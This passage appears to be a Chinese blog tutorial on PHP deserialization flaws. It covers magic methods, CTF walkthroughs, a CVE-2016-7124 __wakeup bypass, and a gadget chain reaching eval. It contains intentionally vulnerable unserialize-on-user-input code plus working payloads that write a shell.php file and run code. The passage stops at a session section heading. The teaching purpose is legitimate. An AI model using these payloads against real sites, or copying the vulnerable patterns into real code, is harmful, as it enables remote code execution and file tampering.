<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="2f997c5702613a33d4df3b92ba888501">序列化与反序列化</h1>
<h2 data-content="1" id="4b0d3036d439bdfee3d77d46f4218dfc">序列化</h2>
<p>定义：利用<code>serialize()</code>函数将一个对象转换为字符串形式<br/>
我们先看一下直接输出对象是什么效果，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">"ghtwf01"</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="s2">"18"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>效果如下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png"/><br/>
这个时候我们利用<code>serialize()</code>函数将这个对象进行序列化成字符串然后输出，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">"ghtwf01"</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="s2">"18"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
    <span class="nv">$a</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>效果如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"/></p>
<p>如果不是<code>public</code>方法那么后面的读取方法就有点不一样，例如代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">"ghtwf01"</span><span class="p">;</span>
        <span class="k">private</span> <span class="nv">$age</span><span class="o">=</span><span class="s2">"18"</span><span class="p">;</span>
        <span class="k">protected</span> <span class="nv">$sex</span><span class="o">=</span><span class="s2">"man"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
    <span class="nv">$a</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>效果如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png"/></p>
<p>private分析：<br/>
这样就发现本来是<code>age</code>结果上面出现的是<code>testage</code>，而且<code>testage</code>长度为<code>7</code>，但是上面显示的是<code>9</code><br/>
查找资料后发现<strong>private属性序列化的时候格式是%00类名%00成员名</strong>，<code>%00</code>占一个字节长度，所以<code>age</code>加了类名后变成了<code>testage</code>长度为<code>9</code></p>
<p>protect分析：<br/>
本来是<code>sex</code>结果上面出现的是<code>*sex</code>，而且<code>*sex</code>的长度是<code>4</code>，但是上面显示的是<code>6</code>，同样查找资料后发现<strong>protect属性序列化的时候格式是%00*%00成员名</strong></p>
<p>这里介绍一下public、private、protected的区别</p>
<div class="highlight"><pre><span></span><span class="x">public(公共的):在本类内部、外部类、子类都可以访问</span>

<span class="x">protect(受保护的):只有本类或子类或父类中可以访问</span>

<span class="x">private(私人的):只有本类内部可以使用</span>
</pre></div>
<h2 data-content="1" id="11082a9a545f2a2f30080e05c1e6b547">反序列化</h2>
<p>定义：反序列化就是利用<code>unserailize()</code>函数将一个经过序列化的字符串还原成php代码形式，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nv">$b</span><span class="o">=</span><span class="s1">'序列化字符串'</span><span class="p">;</span>
    <span class="nv">$b</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<h1 data-content="1" id="aa91f815ed45ebe0c30d939da65d9bb4">反序列化漏洞原理</h1>
<p>到这儿也许大家会想着序列化过去再反序列化回来，不就是形式之间的转换吗，和漏洞有什么关系<br/>
这里先掌握php常见的魔术方法，先列出几个最常见的魔术方法，当遇到这些的时候就需要注意了<br/>
附上讲解魔术方法的链接：<a href="https://segmentfault.com/a/1190000007250604" target="_blank">https://segmentfault.com/a/1190000007250604</a></p>
<div class="highlight"><pre><span></span><span class="x">__construct()当一个对象创建时被调用</span>

<span class="x">__destruct()当一个对象销毁时被调用</span>

<span class="x">__toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用</span>

<span class="x">__sleep() 在对象在被序列化之前运行</span>

<span class="x">__wakeup将在序列化之后立即被调用</span>
</pre></div>
<p>我们用代码演示一下这些魔术方法的使用效果</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s1">'hacked by ghtwf01'</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$b</span><span class="o">=</span><span class="s1">'hacked by blckder02'</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="nf">pt</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">.</span><span class="s1">'&lt;br /&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s1">'__construct&lt;br /&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s1">'__construct&lt;br /&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s1">'__sleep&lt;br /&gt;'</span><span class="p">;</span>
            <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s1">'__wakeup&lt;br /&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">//创建对象调用__construct</span>
    <span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
    <span class="c1">//序列化对象调用__sleep</span>
    <span class="nv">$serialize</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
    <span class="c1">//输出序列化后的字符串</span>
    <span class="k">echo</span> <span class="s1">'serialize: '</span><span class="o">.</span><span class="nv">$serialize</span><span class="o">.</span><span class="s1">'&lt;br /&gt;'</span><span class="p">;</span>
    <span class="c1">//反序列化对象调用__wakeup</span>
    <span class="nv">$unserialize</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$serialize</span><span class="p">);</span>
    <span class="c1">//调用pt输出数据</span>
    <span class="nv">$unserialize</span><span class="o">-&gt;</span><span class="na">pt</span><span class="p">();</span>
    <span class="c1">//脚本结束调用__destruct</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>运行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png"/></p>
<p>原来有一个实例化出的对象，然后又反序列化出了一个对象，就存在两个对象，所以最后销毁了两个对象也就出现了执行了两次<code>__destruct</code></p>
<p>这里我们看一个存在反序列化漏洞的代码</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">"demo"</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'value'</span><span class="p">];</span>
<span class="nv">$a_unser</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这样我们就可以利用这个反序列化代码，利用方法是将需要使用的代码序列化后传入，看到这段代码上面有<code>echo</code>，我们尝试一下在这个页面显示<code>hacked by ghtwf01</code>的字符，现在一边将这段字符串进行序列化，代码如下(这里的类名和对象名要和存在漏洞的代码一致，类名为<code>A</code>,对象名为<code>test</code>)</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="o">=</span><span class="s2">"hacked by ghtwf01"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$b</span><span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
    <span class="nv">$result</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这样就得到这段字符序列化后的内容</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png"/></p>
<p>将它传入目标网页，返回结果如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png"/></p>
<p>既然网页上能输出，那说明也可以进行XSS攻击，尝试一下，虽然有点鸡肋2333，到这里应该懂得点什么叫反序列化漏洞了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png"/></p>
<p>一道简单的反序列化考点题<br/>
<a href="http://120.79.33.253:9001/" target="_blank">http://120.79.33.253:9001/</a></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
<span class="nv">$KEY</span> <span class="o">=</span> <span class="s2">"D0g3!!!"</span><span class="p">;</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'str'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"</span><span class="si">$KEY</span><span class="s2">"</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="si">$flag</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</pre></div>
<p>题目的大意就是反序列化一个变量后的值等于<code>D0g3!!!</code>，这个变量是用户输入的，于是我们写代码将<code>D0g3!!!</code>序列化</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nv">$a</span><span class="o">=</span><span class="s2">"D0g3!!!"</span><span class="p">;</span>
    <span class="nv">$b</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>得到序列化后的内容是</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png"/></p>
<p>将序列化后的内容传入得到flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png"/></p>
<p>现在再来一道bugku的反序列化题<br/>
welcome to bugctf(这道题被恶搞的删了qwq，只好看看网上贴出的代码分析一下)</p>
<p>index.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>  

<span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"txt"</span><span class="p">];</span>  

<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>  

<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>  

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$txt</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">===</span><span class="s2">"welcome to the bugkuctf"</span><span class="p">)){</span>  

    <span class="k">echo</span> <span class="s2">"hello friend!&lt;br&gt;"</span><span class="p">;</span>  

    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/"</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span> 

        <span class="k">echo</span> <span class="s2">"不能现在就给你flag哦"</span><span class="p">;</span>

        <span class="k">exit</span><span class="p">();</span>  

    <span class="p">}</span><span class="k">else</span><span class="p">{</span>  

        <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>   

        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>  

        <span class="k">echo</span> <span class="nv">$password</span><span class="p">;</span>  

    <span class="p">}</span>  

<span class="p">}</span><span class="k">else</span><span class="p">{</span>  

    <span class="k">echo</span> <span class="s2">"you are not the number of bugku ! "</span><span class="p">;</span>  

<span class="p">}</span>  

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>代码有点长我们先来分析一下这串代码想表达什么<br/>
1.先<code>GET</code>传入参数<code>$txt</code>、<code>$file</code>、<code>$password</code><br/>
2.判断<code>$txt</code>是否存在，如果存在并且值为<code>welcome to the bugkuctf</code>就进一步操作，<code>$file</code>参数里面不能包含<code>flag</code>字段<br/>
3.通过以上判断就<code>include($file)</code>，再将<code>$password</code>反序列化并输出</p>
<p>hint.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>   

<span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span><span class="c1">//flag.php  </span>

    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>  

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>  

        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">)){</span>  

            <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span> 

            <span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>

        <span class="k">return</span> <span class="p">(</span><span class="s2">"good"</span><span class="p">);</span>

        <span class="p">}</span>  

    <span class="p">}</span>  

<span class="p">}</span>  

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><code>index.php</code>里面要求<code>$file</code>参数不能包含<code>flag</code>字段，所以文件不能包含<code>flag.php</code>，所以<code>$file=hint.php</code>，把<code>hint.php</code>包含进去，里面存在一个<code>file_get_concents函数</code>可以读文件，想到<code>index.php</code>里面的<code>unserialize</code>函数，所以只需要控制<code>$this-&gt;file</code>就能读取想要的文件<br/>
用这段代码的结果传值给<code>$password</code></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$file</span><span class="o">=</span><span class="s1">'flag.php'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
    <span class="nv">$b</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><code>$password</code>进行反序列化后<code>$file</code>就被赋值为<code>flag.php</code>，然后<code>file_get_contents</code>就得到了<code>flag</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png"/></p>
<p>再来一个反序列化漏洞利用例子，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">foo</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"2.txt"</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
    <span class="k">print</span> <span class="s2">"You have readfile "</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这串代码的意思是将读取的文件内容进行反序列化，<code>__destruct</code>函数里面是生成文件，如果我们本地存在一个文件名是<code>flag.txt</code>，里面的内容是</p>
<div class="highlight"><pre><span></span><span class="x">O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:18:"</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="x">";}</span>
</pre></div>
<p>将它进行反序列化就会生成<code>shell.php</code>里面的内容为<code>&lt;?php phpinfo();?&gt;</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png"/></p>
<h1 data-content="1" id="11c69f6fa300bdc97b93f02eb76087e2">CVE-2016-7124 __wakeup绕过</h1>
<p><strong>__wakeup魔法函数简介</strong><br/>
<code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源<br/>
反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行<br/>
<strong>漏洞影响版本：</strong><br/>
php5 &lt; 5.6.25<br/>
php7 &lt; 7.0.10<br/>
<strong>漏洞复现：</strong><br/>
代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$target</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span> <span class="o">=</span> <span class="s2">"wakeup!"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"D:\Program Files\PHPTutorial\WWW\zx\hello.php"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">);</span>
            <span class="nb">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="p">);</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">];</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"hello.php"</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
    <span class="k">include</span><span class="p">(</span><span class="s2">"./hello.php"</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>魔法函数<code>__wakeup()</code>要比<code>__destruct()</code>先执行，所以我们之间传入<br/>
<code>O:1:"A":1:{s:6:"target";s:18:"&lt;?php phpinfo();?&gt;";}</code><br/>
时会被先执行的<code>__wakeup()</code>函数<code>$target</code>赋值覆盖为<code>wakeup!</code>，然后生成的<code>hello.php</code>里面的内容就是<code>wakeup!</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png"/></p>
<p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行，对象个数原来是1我们将其改为2，也就是<br/>
<code>O:2:"A":1:{s:6:"target";s:18:"&lt;?php phpinfo();?&gt;";}</code><br/>
就能实现绕过</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png"/></p>
<h1 data-content="1" id="09bd5082cfc0ae9547bcefe1dc24c447">注入对象构造方法</h1>
<h2 data-content="1" id="591013a711b0445be6a368b7a4ecba10">当目标对象被private、protected修饰时反序列化漏洞的利用</h2>
<p>上面说了<code>private</code>和<code>protected</code>返回长度和<code>public</code>不一样的原因，这里再写一下</p>
<div class="highlight"><pre><span></span><span class="x">private属性序列化的时候格式是%00类名%00成员名</span>
<span class="x">protect属性序列化的时候格式是%00*%00成员名</span>
</pre></div>
<p><code>protected</code>情况下，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">"hahaha"</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">];</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>利用方式：<br/>
先用如下代码输出利用的序列化串</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">"hacked by ghtwf01"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>得到<code>O:1:"A":1:{s:7:"*test";s:17:"hacked by ghtwf01";}</code><br/>
因为<code>protected</code>是<code>*</code>号两边都有<code>%00</code>，所以必须在<code>url</code>上面也加上，否则不会利用成功</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png"/></p>
<p><code>private</code>情况下，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">"hacked by ghtwf01"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>利用代码这里省略吧，同上面，得到序列化后的字符串为<code>O:1:"A":1:{s:7:"Atest";s:17:"hacked by ghtwf01";</code><br/>
因为<code>private</code>是类名<code>A</code>两边都有<code>%00</code>所以同样在<code>url</code>上面体现</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png"/></p>
<h2 data-content="1" id="6e69b52ca12d849cc642ff995be85e6b">同名方法的利用</h2>
<p>代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$target</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">B</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">class</span> <span class="nc">B</span><span class="p">{</span>
        <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s2">"action B"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">class</span> <span class="nc">C</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s2">"action A"</span><span class="p">;</span>
            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这个例子中，<code>class B</code>和<code>class C</code>有一个同名方法<code>action</code>，我们可以构造目标对象，使得析构函数调用<code>class C</code>的<code>action</code>方法，实现任意代码执行<br/>
利用代码</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$target</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="s2">"phpinfo();"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">class</span> <span class="nc">C</span><span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
            <span class="k">echo</span> <span class="s2">"action C"</span><span class="p">;</span>
            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">A</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png"/></p>
<h1 data-content="1" id="f93ecf7a90be0c196512bad823b40a21">session反序列化漏洞</h1>
<h2 data-content="1" id="d2911cdbdf4f4d858b726213fa1626a9">什么是session</h2>
